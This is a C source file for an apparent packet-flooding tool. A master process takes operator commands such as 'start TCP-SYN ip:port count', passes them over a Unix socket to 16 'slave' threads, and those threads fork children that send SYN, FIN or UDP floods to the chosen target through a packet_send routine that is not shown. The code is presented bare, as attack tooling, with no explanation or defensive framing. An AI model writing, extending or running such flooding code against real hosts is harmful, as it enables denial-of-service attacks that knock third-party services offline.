#include <stdio.h>
#include <stdlib.h>	// exit(), EXIT_SUCCESS, EXIT_FAILURE
#include <string.h>	// memset(), memcpy(), strncpy(), strncmp(), strtok(), strlen()
#include <unistd.h>	// read(), write(), fork(), access(), unlink(), close(), F_OK
#include <signal.h>	// kill()
#include <pthread.h>	// pthread*
#include <sys/un.h>	// struct sockaddr_un
#include <sys/socket.h>	// socket(), connect(), listen(), bind(), accept()
#include <arpa/inet.h>	// inet_aton(), inet_ntoa()

#include "send.h"	// packet_send()
#include "threadpool.h"	// struct Flow, thread_init(), thread_regist(), thread_free()

void *startup(void *filename);

int main()
{
	pthread_t tid[16];
	pthread_attr_t attr;

	char buf[50];
	char *token, *cmd;
	struct Flow flow;
	int times;

	int masterfd;
	int botfd[16];
	struct sockaddr_un master_addr;
	struct sockaddr_un bot_addr[16];

	char filename[9] = "tmp.lock\0";
	int len = sizeof(struct sockaddr_un);
	int i;


	pthread_attr_init(&attr);
	pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

	if( access(filename, F_OK) == 0 ) {
		unlink(filename);
	}

	if( (masterfd = socket(AF_UNIX, SOCK_STREAM, 0)) < 0 ) {
		perror("socket()");
		exit(EXIT_FAILURE);
	}

	memset(&master_addr, 0, sizeof(struct sockaddr_un));
	master_addr.sun_family = AF_UNIX;
	strncpy(master_addr.sun_path, filename, strlen(filename));

	if( bind(masterfd, (struct sockaddr *)&master_addr, sizeof(struct sockaddr_un)) < 0 ) {
		perror("bind()");
		close(masterfd);
		exit(EXIT_FAILURE);
	}

	if( listen(masterfd, 5) < 0 ) {
		perror("listen()");
		close(masterfd);
		exit(EXIT_FAILURE);
	}
	
	for(i = 0; i < 16; i++) {
		if( pthread_create(&tid[i], &attr, startup, filename) != 0 ) {
			perror("pthread_create()");
		}

		if( (botfd[i] = accept(masterfd, (struct sockaddr *)&bot_addr[i], (socklen_t *)&len)) < 0 ) {
			perror("accept()");
			int j;
			for(j = 0; j < i; j++)
				pthread_cancel(tid[j]);

			close(masterfd);
			exit(EXIT_FAILURE);
		}
	}

	thread_init(botfd);

	while( 1 ) {
		printf(">> ");
		fgets(buf, 50, stdin);

		cmd = strtok(buf, " ");

		/* Protocol Type */
		token = strtok(NULL, " ");
		if( strncmp(token, "TCP-SYN", 7) == 0 ) {
			flow.type = SYN;

		}else if( strncmp(token, "TCP-FIN", 7) == 0 ) {
			flow.type = FIN;

		}else if( strncmp(token, "UDP", 3) == 0 ) {
			flow.type = UDP;

		}else {
			printf("Wrong Flag: %s\n", token);
			printf("Ignore Current Commands\n");
			continue;
		}

		/* IP/Port */
		token = strtok(NULL, " ");

		for(i = 0; token[i] != ':'; i++);

		token[i] = '\0';

		flow.port = atoi(token + i + 1);

		if( inet_aton(token, &flow.ip) == 0 ) {
			printf("inet_aton(): Wrong ip: %s\n", token);
			printf("Ignore Current Commands\n");
			continue;
		}

		/* Number of packets */
		times = atoi(strtok(NULL, " "));

		printf("%s %d %d %x\n", inet_ntoa(flow.ip), flow.port, times, flow.type);
		/* Command */
		if( strncmp(cmd, "start", 5) == 0 ) {
			printf("[*] %d / %d slaves are started\n", thread_regist(flow, times), times);

		}else if( strncmp(cmd, "stop", 4) == 0 ) {
			printf("[*] %d / %d slaves are stopped\n", thread_free(flow, times), times);

		}else if( strncmp(cmd, "finish", 6) == 0 ) {
			for(i = 0; i < 16; i++)
				close(botfd[i]);

			close(masterfd);
			exit(EXIT_SUCCESS);

		}else {
			printf("Wrong Command: %s\n", cmd);
			printf("Ignore Current Commands\n");
		}
	}
}

void *startup(void *filename)
{
	int botfd;
	struct sockaddr_un bot_addr;
	struct Flow flow;
	pid_t pid = 0;

	if( (botfd = socket(AF_UNIX, SOCK_STREAM, 0)) < 0 ) {
		printf("[%lu] ",pthread_self());
		perror("socket()");
		return NULL;
	}

	memset(&bot_addr, 0, sizeof(struct sockaddr_un));
	bot_addr.sun_family = AF_UNIX;
	strncpy(bot_addr.sun_path, (char *)filename, strlen((char *)filename));

	if( connect(botfd, (struct sockaddr *)&bot_addr, sizeof(struct sockaddr_un)) < 0 ) {
		printf("[%lu] ",pthread_self());
		perror("connect()");
		return NULL;
	}

	while( 1 ) {
		// start operation
		//printf("\t[%lu] wait on read\n",pthread_self());
		if( read(botfd, (char *)&flow, sizeof(struct Flow)) < 0 ) {
			printf("[%lu] ",pthread_self());
			perror("read()");
			continue;
		}

		if( (pid = fork()) < 0 ) {
			printf("[%lu] ",pthread_self());
			perror("fork()");

		}else if( pid == 0 ) {
		// child
			// send
			printf("[%lu] ",pthread_self());
			//printf("IP: %s, PORT: %d, TYPE: %x\n", inet_ntoa(flow.ip), flow.port, flow.type);
			packet_send(flow.ip, flow.port, flow.type);
		}else {
		// parent
			while( 1 ) {
				// stop operation
				if( read(botfd, (char *)&flow, sizeof(struct Flow)) < 0 ) {
					printf("[%lu] ",pthread_self());
					perror("read()");
					printf("Need to re-send command\n");
				// kill child
				}else if( kill(pid, SIGTERM) == -1 ) {
					printf("[%lu] ",pthread_self());
					perror("kill()");
					printf("Need to re-send command\n");
				// success
				}else
					break;
			}
		}
	}

	close(botfd);
}
